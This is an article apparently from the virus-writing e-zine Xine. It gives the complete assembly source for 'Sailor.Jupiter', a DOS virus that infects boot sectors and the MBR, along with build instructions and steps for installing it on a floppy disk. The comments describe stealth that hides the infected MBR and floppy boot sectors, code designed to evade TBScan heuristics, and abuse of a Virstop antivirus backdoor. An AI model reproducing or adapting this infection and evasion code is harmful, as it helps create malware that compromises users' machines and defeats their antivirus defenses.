
;                                        /-----------------------------\
;                                        | Xine - issue #1 - Phile 022 |
;                                        \-----------------------------/


;
;
; b0z0 presents:
; Sailor.Jupiter
;
; well, boot infectors... it has to be done :) let's see what it does:
;   - infects BS/MBR. Original MBR is on 0,0,2 and original BS on
;     floppyes is on 0,1,14.
;   - MBR stealth on write/read/verify
;   - Floppy BS stealth on read. I haven't implemented floppy BS stealth
;     on write because i think that is a waste of space. infact it gets
;     a lot of space to test all the possible writings to the original
;     bs. and a non complete check will only bring problems. anyway if
;     a user formats the diskette while the virus is in mem it will be
;     infect on the first read, that's the stage when format checks the
;     total space on diskette :)
;   - Heavy antiheuristic structures agains TBScan. the infected boot
;     sectors actually doesn't flag any flag with TBScan 7.04. well, that
;     article on the flags was of use for someone :)
;   - Anti-Virstop feature. This is the first virus, i think, that uses
;     the Virstop backdoor, so the AV won't notice the infected boot
;     sector when a user read an infected diskette. Thanx Dandler!
;
;
; Once again thanx to Dandler for his help with my first boot experience :)
;
;
; To compile:
;  TASM /ZI /M2 JUPITER.ASM
;  TLINK /M /V JUPITER.OBJ
;  TDSTRIP -C JUPITER.EXE
; and then put the resulting file at the boot sector of a floppy disk.
; pay attention, you must of course preserve the first 03eh bytes of the
; original boot sector
;


.model tiny
.code

        org     0

start:
        jmp     short virus_start
        nop
                            ;<-- important floppy stuff comes here
        org     03eh

virus_start:
        cli
        xor     ax,ax
        mov     ss,ax           ;adjust ss:sp
        mov     sp,7c00h
        push    ax
        pop     es
        push    ax
        pop     ds
        sti

        mov     ax,201h
        mov     bx,offset virus_end+7c00h;read to our buffer after the virus
        mov     dx,80h
        mov     cx,1
        int     13h             ;read mbr
        jc      no_mbr          ;go away if hd not present

        mov     si,offset virus_name+7c00h
        push    si
        pop     di
        add     di,offset virus_end
        mov     cx,7
        rep     cmpsw            ;check if the mbr is already infected?
        je      no_mbr

        mov     byte ptr floppymarker+7c00h,1   ;HD mark
        mov     ax,202h
        inc     ah
        mov     bx,7c00h
        mov     cx,1            ;write virus and original mbr
        int     13h

        mov     byte ptr floppymarker+7c00h,0   ;reset marker

no_mbr:
        mov     di,412h                ; well, goodbye TBScan ]:)
        inc     di
        dec     word ptr ds:[di]
        mov     ax,word ptr ds:[di]
        mov     cl,6
        shl     ax,cl                           ;get mem
        mov     es,ax

        xchg    word ptr ds:[04eh],ax       ;put new segment
        mov     seg13h+7c00h,ax             ;save old int13h segment
        mov     ax,offset int13h_handler    ;ax=new int13h handler
        xchg    word ptr ds:[04ch],ax
        mov     off13h+7c00h,ax             ;save old offset

        mov     si,100h       ;
        push    si            ; so TBScan wouldn't trigger the O flag
        pop     cx            ;
        mov     si,7C00h
        push    si
        xor     di,di
        rep     movsw           ;copy the virus in our 1kb mem space


        push    cs
        pop     es                      ;ES=CS

        mov     ax,201h                 ;read to 0:7c00h
        pop     bx
        mov     cx,1
        cmp     byte ptr cs:[floppymarker+7c00h],0      ;is hd or fd?
        jne     isharddisk
        mov     cx,000eh
        mov     dl,0
        mov     dh,1

isharddisk:
        push    013cdh                ;put CD13 at 7c00h-2
        jmp     start-2               ;jump there and execute the read

int13h_handler:
        cmp     cx,1
        jne     do_int_13
        cmp     dh,0
        jne     do_int_13
        cmp     dl,80h                          ;something on mbr?
        je      mbr_stealth
        cmp     dl,1                            ;Read floppy boot?
        ja      do_int_13
        cmp     ax,201h                         ;read 1 sector
        je      floppy_infection
do_int_13:
    db      0EAh
off13h   dw      ?
seg13h   dw      ?

mbr_stealth:
        push    cx

        mov     cl,2
        int     13h                         ;return original mbr

        pop     cx
        retf    2

floppy_infection:
        pushf
        call    dword ptr cs:off13h
        jc      read_error
        pushf
        push    ax
        push    bx
        push    cx
        push    si
        push    di
        push    ds
        push    es

        push    es
        pop     ds
        push    cs
        pop     es

        lea     si,[offset virus_name + bx]
        mov     di,offset virus_name
        mov     cx,7
        rep     cmpsw
        je      fbs_stealth   ; already infected? just hide the virus bs

        push    es
        push    dx
        push    ds
        pop     es
        mov     ax,201h
        push    ax
        inc     ah
        mov     cx,000eh
        mov     dh,01h
        int     13h             ; copy original boot to 0,1,14
        pop     ax

        pop     dx
        pop     es
        jc      fb_exit         ; error occoured? go away

        mov     byte ptr cs:[floppymarker],0
        lea     si,[bx+03h]    ; copy original BS bytes from offset 03h
        mov     di,03h         ; to offset 3eh
        mov     cx,03bh
        rep     movsb

        mov     word ptr es:[2fh],10cdh         ;Virstop rulesss ]:)

        push    bx
        inc     ah
        sub     bx,bx                           ;mov    BX,offset START
        mov     cx,1
        int     13h                             ;Infect floppy boot
        pop     bx

fbs_stealth:
        push    ds
        pop     es
        mov     ax,201h
        mov     cx,000eh                     ;read the original one to
        mov     dh,01h                       ;ES:BX and give it to the
        int     13h                          ;user

fb_exit:
        pop     es
        pop     bx
        pop     di
        pop     si
        pop     cx
        pop     bx
        pop     ax
        popf
read_error:
        retf    2

virus_name      db      'Sailor.Jupiter',0
virus_author    db      'b0z0/iKx',0            ; :)

floppymarker db      00h

        org     01feh

boot_mbr:
        db      55h,0AAh

        org     200h

virus_end:

end
